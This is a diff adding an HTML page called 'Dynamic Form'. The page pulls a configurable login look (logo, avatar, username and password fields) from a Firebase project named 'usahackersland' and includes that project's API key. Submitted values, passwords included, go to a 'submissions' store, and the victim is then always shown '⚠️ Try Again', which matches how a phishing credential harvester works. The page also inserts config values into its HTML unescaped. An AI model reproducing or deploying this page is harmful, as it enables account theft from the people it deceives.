@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dynamic Form</title>
+
+<style>
+body{
+  font-family: Arial, sans-serif;
+  background:#f4f6f8;
+  padding:20px;
+}
+
+#formContainer{
+  max-width:600px;
+  margin:auto;
+  background:#fff;
+  padding:20px;
+  border-radius:10px;
+  box-shadow:0 0 10px rgba(0,0,0,0.1);
+}
+
+/* BUILDER MEDIA */
+.builder-media{
+  text-align:center;
+  margin-bottom:12px;
+}
+.builder-media img{
+  max-width:140px;
+  height:auto;
+  margin-bottom:8px;
+}
+
+/* TEXT */
+h2{
+  text-align:center;
+  margin:10px 0;
+}
+#formDesc{
+  text-align:center;
+  margin-bottom:12px;
+}
+
+/* WARNINGS */
+#failureWarning{
+  color:#b71c1c;
+  font-weight:bold;
+  text-align:center;
+  margin-bottom:4px;
+}
+#submitResult{
+  color:#b71c1c;
+  font-weight:bold;
+  text-align:center;
+  margin-bottom:10px;
+  opacity:0;
+  transition:opacity 0.5s;
+}
+
+/* INPUTS */
+input, textarea, button{
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+  border-radius:6px;
+  border:1px solid #ccc;
+  box-sizing:border-box;
+}
+
+button{
+  cursor:pointer;
+  background:#1976d2;
+  color:#fff;
+  border:none;
+}
+
+/* EMBED LINKS */
+.embedLink{
+  margin-top:6px;
+  padding:6px;
+  background:#e8f0fe;
+  border-radius:6px;
+  word-break:break-all;
+}
+</style>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+</head>
+
+<body>
+<div id="formContainer">
+
+  <!-- BUILDER MEDIA -->
+  <div id="imageContainer" class="builder-media"></div>
+
+  <!-- TITLE & DESC -->
+  <h2 id="formTitle">Loading...</h2>
+  <div id="formDesc"></div>
+
+  <!-- WARNINGS -->
+  <div id="failureWarning"></div>
+  <div id="submitResult">⚠️ Try Again</div>
+
+  <!-- FORM -->
+  <form id="dynamicForm"></form>
+
+  <!-- LINKS -->
+  <div id="embedLinks"></div>
+
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+
+/* FIREBASE */
+firebase.initializeApp({
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland"
+});
+const db = firebase.firestore();
+
+/* PARAMS */
+const formId = new URLSearchParams(location.search).get("id");
+const formEl = $("dynamicForm");
+const imageContainer = $("imageContainer");
+const embedEl = $("embedLinks");
+const submitResult = $("submitResult");
+const failureWarning = $("failureWarning");
+
+let formConfig = null;
+
+if(!formId){
+  $("formTitle").innerText = "Form ID missing!";
+}
+
+/* LOAD FORM */
+db.collection("forms").doc(formId).get().then(doc=>{
+  if(!doc.exists){
+    $("formTitle").innerText = "Form not found!";
+    return;
+  }
+  formConfig = doc.data();
+  renderForm();
+});
+
+/* RENDER BUILDER-ACCURATE (NO EXTRA INPUTS) */
+function renderForm(){
+  $("formTitle").innerText = formConfig.title || "";
+  $("formTitle").style.color = formConfig.titleColor || "#000";
+
+  $("formDesc").innerText = formConfig.description || "";
+  $("formDesc").style.color = formConfig.textColor || "#444";
+
+  imageContainer.innerHTML = "";
+  formEl.innerHTML = "";
+  embedEl.innerHTML = "";
+  failureWarning.innerText = "";
+
+  /* MEDIA */
+  if(formConfig.avatarURL){
+    imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
+  }
+  if(formConfig.logoURL){
+    imageContainer.innerHTML += `<img src="${formConfig.logoURL}">`;
+  }
+
+  /* WARNING */
+  if(formConfig.enableWarning && formConfig.warning){
+    failureWarning.innerText = formConfig.warning;
+  }
+
+  /* AUTH FIELDS — ONLY IF PLACEHOLDERS EXIST */
+  if(
+    formConfig.addAuth &&
+    formConfig.usernamePlaceholder &&
+    formConfig.passwordPlaceholder
+  ){
+    formEl.innerHTML += `
+      <input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
+      <input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>
+    `;
+  }
+
+  /* EXTRA FIELDS — FILTER EMPTY */
+  if(Array.isArray(formConfig.extraFields)){
+    formConfig.extraFields
+      .filter(f => typeof f === "string" && f.trim() !== "")
+      .forEach(f=>{
+        formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
+      });
+  }
+
+  /* MAIN BUTTON */
+  if(formConfig.showMainBtn && formConfig.buttonText){
+    const btn = document.createElement("button");
+    btn.textContent = formConfig.buttonText;
+    btn.style.background = formConfig.btnColor || "#1976d2";
+    btn.onclick = submitForm;
+    formEl.appendChild(btn);
+  }
+
+  /* EMBED LINKS */
+  if(Array.isArray(formConfig.embedLinks)){
+    formConfig.embedLinks.forEach(l=>{
+      if(!l || !l.show || !l.url) return;
+      embedEl.innerHTML += `
+        <div class="embedLink">
+          <strong>${l.text || ""}</strong><br>
+          <a href="${l.url}" target="_blank">${l.url}</a>
+          ${l.desc ? `<br><small>${l.desc}</small>` : ""}
+        </div>
+      `;
+    });
+  }
+}
+
+/* SUBMIT */
+function submitForm(e){
+  e.preventDefault();
+
+  const data = {};
+  formEl.querySelectorAll("input,textarea").forEach(i=>{
+    if(i.value.trim() !== ""){
+      data[i.name] = i.value;
+    }
+  });
+
+  db.collection("submissions").add({
+    formId,
+    data,
+    createdAt: new Date().toISOString()
+  });
+
+  submitResult.style.opacity = 1;
+  setTimeout(()=>submitResult.style.opacity = 0, 3000);
+
+  formEl.reset();
+}
+</script>
+</body>
+</html>
